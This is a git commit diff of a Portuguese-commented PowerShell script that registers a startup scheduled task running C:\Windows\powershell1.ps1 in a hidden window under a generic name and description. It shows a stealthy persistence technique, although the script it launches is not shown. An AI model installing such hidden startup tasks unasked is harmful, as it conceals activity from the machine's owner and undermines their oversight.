7d23be9b22953425914ed7bbb189b9fd3636caf0
so251 <aquelequefujedocombateecorno@tutamail.com>
2024-07-17 18:13:38 -0300

    Update registro.ps1

--- registro.ps1
+++ registro.ps1
@@ -1,1 +1,14 @@
-Register-ScheduledTask -TaskName "Powershell Boot Script" -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File 'C:\Windows\powershell1.ps1'") -Trigger (New-ScheduledTaskTrigger -AtStartup) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries) -Description "PowerShell" -Force
+# Caminho do script PowerShell
+$scriptPath = "C:\Windows\powershell1.ps1"
+
+# Cria a ação para executar o script PowerShell de forma oculta
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File ""$scriptPath"""
+
+# Define o gatilho para iniciar a tarefa no boot do sistema
+$trigger = New-ScheduledTaskTrigger -AtStartup
+
+# Configurações da tarefa agendada para permitir execução em laptops/baterias e não interromper se estiverem em uso
+$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+
+# Registra a tarefa agendada no sistema
+Register-ScheduledTask -TaskName "Powershell Boot Script" -Action $action -Trigger $trigger -Settings $settings -Description "PowerShell" -Force
